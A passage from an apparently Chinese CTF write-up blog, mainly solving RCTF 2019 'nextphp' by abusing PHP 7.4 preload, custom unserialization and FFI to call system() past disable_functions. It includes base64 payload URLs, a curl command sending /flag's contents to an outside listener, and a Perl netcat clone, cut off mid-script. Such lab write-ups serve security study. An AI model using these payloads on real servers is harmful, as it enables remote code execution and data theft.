class=\"keyword\">not</span> <span class=\"keyword\">in</span> c.text:</span><br><span class=\"line\">            flag+=chr(b)</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n\n    <div id=\"aplayer-aBQskzmZ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"4875306\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{d4131ee5-def8-4c8b-9778-1bab77190f59}</p>\r\n","categories":["Writeups"],"tags":["PHP","SQL注入"]},{"title":"BUUOJ刷题-Web-nextphp","url":"/2019/10/04/BUUOJ%E5%88%B7%E9%A2%98-Web-nextphp/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>RCTF 2019的nextphp。</p>\r\n<p>开局一个eval，剩下全靠编。 <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;a&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">&#x27;a&#x27;</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\r\n<p>想当然地先试一下system，不出所料的被disable了，那么看一下phpinfo吧。PHP 7.4.0-dev，特别新的版本。额外加载了/usr/local/etc/php/conf.d/php-nextphp.ini，ReflectionClass被Ban，一大堆函数也被Ban了：<code>set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</code>。可以看到，执行命令的函数全Ban，mail也Ban了，设置了open_basedir为/var/www/html。</p>\r\n<p>目前我们可以读文件内容与列目录。/?a=print_r(scandir(\".\"));，发现有preload.php，我们读一下内容：</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> <span class=\"keyword\">implements</span> <span class=\"title\">Serializable</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $data = [</span><br><span class=\"line\">        <span class=\"string\">&#x27;ret&#x27;</span> =&gt; <span class=\"literal\">null</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;func&#x27;</span> =&gt; <span class=\"string\">&#x27;print_r&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;arg&#x27;</span> =&gt; <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">    ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">run</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;data[<span class=\"string\">&#x27;ret&#x27;</span>] = <span class=\"keyword\">$this</span>-&gt;data[<span class=\"string\">&#x27;func&#x27;</span>](<span class=\"keyword\">$this</span>-&gt;data[<span class=\"string\">&#x27;arg&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__serialize</span>(<span class=\"params\"></span>): <span class=\"title\">array</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__unserialize</span>(<span class=\"params\"><span class=\"keyword\">array</span> $data</span>) </span>&#123;</span><br><span class=\"line\">        array_merge(<span class=\"keyword\">$this</span>-&gt;data, $data);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">serialize</span> (<span class=\"params\"></span>): <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> serialize(<span class=\"keyword\">$this</span>-&gt;data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">unserialize</span>(<span class=\"params\">$payload</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;data = unserialize($payload);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span> (<span class=\"params\">$key</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;data[$key];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span> (<span class=\"params\">$key, $value</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> \\<span class=\"built_in\">Exception</span>(<span class=\"string\">&#x27;No implemented&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> \\<span class=\"built_in\">Exception</span>(<span class=\"string\">&#x27;No implemented&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>我们可以在index.php中unserialize一个类，但是我们目前并不知道preload.php的类与index.php有什么联系。</p>\r\n<p>这时就要问一个问题，为什么要用PHP 7.4？我们查一下PHP 7.4的<a href=\"https://stitcher.io/blog/new-in-php-74\">新特性</a>，发现有几个很有趣：<a href=\"https://wiki.php.net/rfc/preload\">Preloading</a>和<a href=\"https://wiki.php.net/rfc/custom_object_serialization\">New Custom Object Serialization Mechanism</a>。Preload机制简单来说就是在PHP7.4中，允许我们在Web服务运行周期内提前预加载某些PHP文件，加载的文件将在所有PHP文件中可用。而自定义的序列化机制就有点意思了，我们可以在类中重写新的魔法函数：__serialize和__unserialize，unserialize的时候会调用run()，run()调用<span class=\"math inline\">\\(data[&#39;func&#39;]所指函数，返回值写到\\)</span>data['ret']里，而且提供了__get方法允许我们得到返回值。</p>\r\n<p>我们试一下： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> <span class=\"keyword\">implements</span> <span class=\"title\">Serializable</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $data = [</span><br><span class=\"line\">        <span class=\"string\">&#x27;ret&#x27;</span> =&gt; <span class=\"literal\">null</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;func&#x27;</span> =&gt; <span class=\"string\">&#x27;print_r&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;arg&#x27;</span> =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">            <span class=\"string\">&quot;123&quot;</span>=&gt;<span class=\"string\">&quot;abc&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;456&quot;</span>=&gt;<span class=\"string\">&quot;def&quot;</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">    ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">run</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;data[<span class=\"string\">&#x27;ret&#x27;</span>] = <span class=\"keyword\">$this</span>-&gt;data[<span class=\"string\">&#x27;func&#x27;</span>](<span class=\"keyword\">$this</span>-&gt;data[<span class=\"string\">&#x27;arg&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__serialize</span>(<span class=\"params\"></span>): <span class=\"title\">array</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__unserialize</span>(<span class=\"params\"><span class=\"keyword\">array</span> $data</span>) </span>&#123;</span><br><span class=\"line\">        array_merge(<span class=\"keyword\">$this</span>-&gt;data, $data);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">serialize</span> (<span class=\"params\"></span>): <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> serialize(<span class=\"keyword\">$this</span>-&gt;data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">unserialize</span>(<span class=\"params\">$payload</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;data = unserialize($payload);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span> (<span class=\"params\">$key</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;data[$key];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span> (<span class=\"params\">$key, $value</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> \\<span class=\"built_in\">Exception</span>(<span class=\"string\">&#x27;No implemented&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=<span class=\"keyword\">new</span> A();</span><br><span class=\"line\"><span class=\"keyword\">print</span>(base64_encode(serialize($a)).<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">print</span>(serialize($a));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure> 然后访问<code>/?a=unserialize(base64_decode(%22QzoxOiJBIjo5MTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6NzoicHJpbnRfciI7czozOiJhcmciO2E6Mjp7aToxMjM7czozOiJhYmMiO2k6NDU2O3M6MzoiZGVmIjt9fX0=%22))-%3E__get(%27ret%27);</code>发现我们确实能够print_r一个数组。这证实了preload.php确实被预加载了，然后呢？反序列化对于本题目前没有任何作用。</p>\r\n<p>我们再翻PHP的What's New，发现还有一条：FFI(Foreign Function Interface)，允许我们在PHP中使用C的函数。具体参考<a href=\"https://wiki.php.net/rfc/ffi\">这里</a>，那么我们就可以使用FFI类执行system()，从而得到flag。可是我们在index.php中使用FFI类不能产生效果，后来发现PHP对于ffi有一定的限制，当ffi.enable=preload时，FFI仅能在CLI和preload的文件中使用。那么我们使用反序列化的点就好了。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> <span class=\"keyword\">implements</span> <span class=\"title\">Serializable</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $data = [</span><br><span class=\"line\">        <span class=\"string\">&#x27;ret&#x27;</span> =&gt; <span class=\"literal\">null</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;func&#x27;</span> =&gt; <span class=\"string\">&#x27;FFI::cdef&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;arg&#x27;</span> =&gt; <span class=\"string\">&quot;int system(const char *command);&quot;</span></span><br><span class=\"line\">    ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">run</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;data[<span class=\"string\">&#x27;ret&#x27;</span>] = <span class=\"keyword\">$this</span>-&gt;data[<span class=\"string\">&#x27;func&#x27;</span>](<span class=\"keyword\">$this</span>-&gt;data[<span class=\"string\">&#x27;arg&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__serialize</span>(<span class=\"params\"></span>): <span class=\"title\">array</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__unserialize</span>(<span class=\"params\"><span class=\"keyword\">array</span> $data</span>) </span>&#123;</span><br><span class=\"line\">        array_merge(<span class=\"keyword\">$this</span>-&gt;data, $data);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">serialize</span> (<span class=\"params\"></span>): <span class=\"title\">string</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> serialize(<span class=\"keyword\">$this</span>-&gt;data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">unserialize</span>(<span class=\"params\">$payload</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;data = unserialize($payload);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span> (<span class=\"params\">$key</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;data[$key];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span> (<span class=\"params\">$key, $value</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> \\<span class=\"built_in\">Exception</span>(<span class=\"string\">&#x27;No implemented&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=<span class=\"keyword\">new</span> A();</span><br><span class=\"line\"><span class=\"keyword\">print</span>(base64_encode(serialize($a)).<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">print</span>(serialize($a));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\r\n<p>然后访问<code>/?a=unserialize(base64_decode(%22QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319%22))-%3E__get(%27ret%27)-%3Esystem(%22ls%22);](http://a899b5e3-3096-4f14-b6d0-8d4a282bcfc5.node2.buuoj.cn.wetolink.com:82/?a=unserialize(base64_decode(\"QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319\"))-&gt;__get('ret')-&gt;system(\"ls\");)</code>，注意__get('ret')是必要的，因为FFI::cdef()返回的对象保存在data['ret']中。注意到没有回显，因为system会把输出放在STDOUT中，PHP没法接收到，那么我们可以将其发送到VPS中。<code>http://a66c3418-bd96-47dd-aae4-e3904e2835ff.node2.buuoj.cn.wetolink.com:82/?a=unserialize(base64_decode(\"QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319\"))-&gt;__get('ret')-&gt;system('curl http://172.2.0.8:5277 -d \"abc=\\</code>cat /flag`\"');`，由于BUUOJ的限制，我们只能另开一台Linux靶机，然后借助这个向外传递结果了。在Linux靶机上监听5277端口，就能收到flag了。 P.S. BUUOJ上的Linux靶机没有nc，我们用Perl写了个Perlcat。 <figure class=\"highlight perl\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/perl</span></span><br><span class=\"line\"><span class=\"keyword\">use</span> strict;</span><br><span class=\"line\"><span class=\"keyword\">use</span> warnings;</span><br><span class=\"line\"><span class=\"keyword\">use</span> IO::Socket;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># subroutines</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">argerr</span></span>($)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> STDERR <span class=\"string\">&quot;ERROR: &quot;</span>.$_[<span class=\"number\">0</span>].<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">    usage();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">usage</span></span>()&#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> STDERR <span class=\"string\">&quot;Usage: $0 [OPTIONS] [DESTINATION IP] PORT\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> STDERR <span class=\"string\">&quot;Options:\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> STDERR <span class=\"string\">&quot;  -l         Open and listen TCP port\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> STDERR <span class=\"string\">&quot;  -p [PORT]  TCP port\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> STDERR <span class=\"string\">&quot;  -v         Verbose\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># main</span></span><br><span class=\"line\"><span class=\"keyword\">my</span> $addr;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $port=<span class=\"number\">9001</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $listen=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $verbose=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># parse arguments...</span></span><br><span class=\"line\"><span class=\"comment\"># print usage if no arguments</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($#ARGV == -<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">    argerr(<span class=\"string\">&quot;No arguments!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># search for help argument</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"number\">0</span>..$#ARGV)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($ARGV[$_] =~ <span class=\"regexp\">m/--help/</span> || $ARGV[$_] =~ <span class=\"regexp\">m/-h/</span>) &#123;</span><br><span class=\"line\">\tusage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get options</span></span><br><span class=\"line\"><span class=\"keyword\">my</span> $readport=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $readexec=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"number\">0</span>..$#ARGV)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($ARGV[$_] =~ <span class=\"regexp\">m/^-[a-zA-Z]+/</span> &amp;&amp; $readport == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">my</span> $opts = $ARGV[$_];</span><br><span class=\"line\">\t$opts =~ <span class=\"regexp\">s/^.//</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">foreach</span>(<span class=\"keyword\">split</span>(<span class=\"string\">&#x27;&#x27;</span>, $opts))&#123;</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span>($_ eq <span class=\"string\">&quot;l&quot;</span>)&#123;</span><br><span class=\"line\">\t\t$listen=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t    <span class=\"keyword\">elsif</span>($_ eq <span class=\"string\">&quot;p&quot;</span>)&#123;</span><br><span class=\"line\">\t\t$readport=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t    <span class=\"keyword\">elsif</span>($_ eq <span class=\"string\">&quot;v&quot;</span>)&#123;</span><br><span class=\"line\">\t\t$verbose=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">elsif</span>($readport == <span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\t$readport=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($ARGV[$_] !~ <span class=\"regexp\">m/^\\d+$/</span>)&#123;</span><br><span class=\"line\">\t    argerr(<span class=\"string\">&quot;PORT syntax error!&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$port = $ARGV[$_];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> $socket;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $connection;</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"comment\"># mode of operation</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($listen == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"comment\"># search for an IPv4 number followed by a port number</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($ARGV[$#ARGV-<span class=\"number\">1</span>] =~ <span class=\"regexp\">m/^\\d+.\\d+.\\d+.\\d+$/</span> &amp;&amp; $ARGV[$#ARGV] =~ <span class=\"regexp\">m/^\\d+$/</span>)&#123;</span><br><span class=\"line\">\t$addr = $ARGV[$#ARGV-<span class=\"number\">1</span>];</span><br><span class=\"line\">\t$port = $ARGV[$#ARGV];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">defined</span> $addr) &#123;argerr(<span class=\"string\">&quot;IP and PORT syntax error!&quot;</span>);&#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">defined</span> $port) &#123;argerr(<span class=\"string\">&quot;IP and PORT syntax error!&quot;</span>);&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>($addr !~ <span class=\"regexp\">m/^\\d+.\\d+.\\d+.\\d+$/</span> || $port !~ <span class=\"regexp\">m/^\\d+$/</span>)&#123;</span><br><span class=\"line\">    argerr(<span class=\"string\">&quot;IP and PORT syntax error!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># create socket interface</span></span><br><span class=\"line\">    $socket = new IO::Socket::INET(</span><br><span class=\"line\">    <span class=\"string\">Proto =&gt;</span> <span class=\"string\">&#x27;tcp&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">PeerAddr =&gt;</span> $addr,</span><br><span class=\"line\">    <span class=\"string\">PeerPort =&gt;</span> $port,</span><br><span class=\"line\">    <span class=\"string\">Reuse =&gt;</span> <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"string\">Timeout =&gt;</span> <span class=\"number\">10</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">die</span> <span class=\"string\">&quot;Could not create socket: $!\\n&quot;</span> <span class=\"keyword\">unless</span> $socket;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $connection = $socket;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\"># listen on port</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($verbose)&#123; <span class=\"keyword\">print</span> STDERR <span class=\"string\">&quot;Listening on port &quot;</span>. $port .<span class=\"string\">&quot;...\\n&quot;</span>; &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># create socket interface</span></span><br><span class=\"line\">    $socket = new IO::Socket::INET (</span><br><span class=\"line\">    <span class=\"string\">LocalPort =&gt;</span> $port,</span><br><span class=\"line\">    <span class=\"string\">Proto =&gt;</span> <span class=\"string\">&#x27;tcp&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">Listen =&gt;</span> <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"string\">Reuse =&gt;</span> <span class=\"number\">1</span>,);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">die</span> <span class=\"string\">&quot;Could not create socket: $!\\n&quot;</span> <span class=\"keyword\">unless</span> $socket;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># accept client connection</span></span><br><span class=\"line\">    <span class=\"keyword\">my</span> $client = $socket-&gt;<span class=\"keyword\">accept</span>();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>($verbose)&#123; <span class=\"keyword\">print</span> STDERR <span class=\"string\">&quot;Connection from &quot;</span>. $client-&gt;peerhost() .<span class=\"string\">&quot;\\n&quot;</span>; &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $connection = $client;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fork writer</span></span><br><span class=\"line\"><span class=\"keyword\">die</span> <span class=\"string\">&quot;Can&#x27;t fork writer: $!&quot;</span> <span class=\"keyword\">unless</span> <span class=\"keyword\">defined</span>(<span class=\"keyword\">my</span> $writepid = <span class=\"keyword\">fork</span>());</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># split the fork</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($writepid) &#123;</span><br><span class=\"line\">    <span class=\"comment\"># copy the socket to standard output</span></span><br><span class=\"line\">    <span class=\"keyword\">my</span> $buffer;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>($connection-&gt;<span class=\"keyword\">read</span>($buffer,<span class=\"number\">1</span>))&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">syswrite</span>(STDOUT,$buffer,<span class=\"number\">1</span>);</span><br><span class=\"line\">    